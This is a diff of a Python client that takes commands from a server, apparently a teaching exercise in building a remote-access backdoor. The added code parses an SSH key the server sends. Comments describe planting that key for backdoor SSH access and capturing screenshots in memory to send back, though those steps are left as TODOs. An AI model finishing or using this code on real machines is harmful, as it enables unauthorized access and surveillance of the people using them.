@@ -128,7 +128,13 @@ while True:
 				    t.start()
 
 			if info[0] == "ssh":
-				ssh_key = info[1]
+				if(len(info) == 1):
+					replyToServer("SSH public key is needed")
+				ssh_key = ""
+				for i in range(1, len(info)):
+					ssh_key = ssh_key + info[i] + " "
+				print(ssh_key)
+
 				## TODO(client side): append the ssh key to _you_should_know_which file
 				##                    so that the server has a backdoor to ssh in
 				## ---------------------------------
@@ -142,6 +148,7 @@ while True:
 				## Requirement: this should be done in memory without saving the screenshot as a file
 				## ---------------------------------
 				## your code goes here
+				## hint: aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMzMxMDE5MzUvY29udmVydC1waWwtaW1hZ2UtdG8tYnl0ZS1hcnJheQ==
 				image_size = len('')
 				## ---------------------------------
 
